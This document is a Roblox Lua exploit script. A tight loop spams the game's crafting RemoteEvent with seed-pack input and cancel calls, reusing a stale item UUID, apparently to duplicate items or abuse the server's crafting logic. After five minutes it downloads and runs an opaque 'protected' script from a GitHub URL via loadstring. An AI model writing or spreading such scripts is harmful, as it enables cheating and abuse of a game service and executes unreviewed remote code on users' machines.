local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local backpack = player:WaitForChild("Backpack")
local CraftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("CraftingGlobalObjectService")
local craftingBench = workspace:WaitForChild("Interaction"):WaitForChild("UpdateItems"):WaitForChild("NewCrafting"):WaitForChild("SeedEventCraftingWorkBench")

local lastSeedPackUUID = nil

-- Helper
local function getSeedPackToolAndUUID()
    for _, tool in ipairs(backpack:GetChildren()) do
        if tool:IsA("Tool") and tool:GetAttribute("n") == "Flower Seed Pack" then
            return tool, tool:GetAttribute("c")
        end
    end
    return nil, nil
end

local function isToolEquipped(tool)
    return tool and tool.Parent == character
end

local function equipTool(tool)
    if tool and not isToolEquipped(tool) then
        tool.Parent = character
        task.wait(0.003)
    end
end

local function useEquippedTool()
    local tool = character:FindFirstChildOfClass("Tool")
    if tool then
        pcall(function() tool:Activate() end)
    end
end

-- Run the crafting loop in a separate coroutine
coroutine.wrap(function()
    while true do
        local tool, uuid = getSeedPackToolAndUUID()
        if tool and uuid then
            lastSeedPackUUID = uuid
            CraftingService:FireServer(
                "InputItem",
                craftingBench,
                "SeedEventWorkbench",
                1,
                {
                    ItemType = "Seed Pack",
                    ItemData = {UUID = uuid}
                }
            )
        elseif lastSeedPackUUID then
            CraftingService:FireServer(
                "InputItem",
                craftingBench,
                "SeedEventWorkbench",
                1,
                {
                    ItemType = "Seed Pack",
                    ItemData = {UUID = lastSeedPackUUID}
                }
            )
        end
        CraftingService:FireServer("CancelRecipe", craftingBench, "SeedEventWorkbench")
        if tool then
            equipTool(tool)
            useEquippedTool()
        end
        task.wait(0.003)
    end
end)()

-- Wait 5 minutes (300 seconds) then load the server hopper
task.wait(300)
loadstring(game:HttpGet("https://raw.githubusercontent.com/scrintisnotfun/UsefulTools/refs/heads/main/Sever-Hopper-Protected_9673346355789434.lua"))()